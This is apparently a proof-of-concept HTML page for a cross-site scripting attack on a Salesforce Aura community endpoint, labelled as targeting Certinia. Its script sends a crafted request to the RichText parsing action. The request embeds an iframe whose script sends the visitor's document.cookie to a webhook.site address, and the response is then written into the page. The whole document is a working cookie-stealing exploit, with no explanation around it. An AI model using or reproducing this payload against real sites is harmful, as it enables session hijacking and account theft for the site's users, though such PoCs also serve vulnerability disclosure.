<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>XSS Aura PoC - Certinia</title>
</head>
<body>
  <h2>Loading...</h2>
  <script>
    fetch("/community/s/sfsites/aura?r=0&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=1", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: `message={"actions":[{"id":"1;a","descriptor":"serviceComponent://ui.communities.components.aura.components.forceCommunity.richText.RichTextController/ACTION$getParsedRichTextValue","callingDescriptor":"markup://forceCommunity:richText","params":{"html":"<iframe srcdoc='<script>fetch(\'https://webhook.site/d893981c-161e-4afd-a3c5-361f9c6274d0?cookie=\'+document.cookie)</script>'>","version":"64.0","storable":true}]}&aura.context={"mode":"PROD","fwuid":"VXlnM1FET1BLV0NVVUNZMW9MNmU3UWdLNVAwNUkzRVNnOFJ1eVRYdHBvVVExMi42MjkxNDU2LjE2Nzc3MjE2","app":"siteforce:communityApp","loaded":{"APPLICATION@markup://siteforce:communityApp":"1296_E-0fs7eMs-UxUK_92StDMQ"},"dn":[],"globals":{},"uad":true}&aura.pageURI=/community/s/&aura.token=null`
    })
    .then(res => res.json())
    .then(json => {
      document.body.innerHTML += json.actions[0].returnValue;
    })
    .catch(err => {
      document.body.innerHTML = '<pre>' + err + '</pre>';
    });
  </script>
</body>
</html>
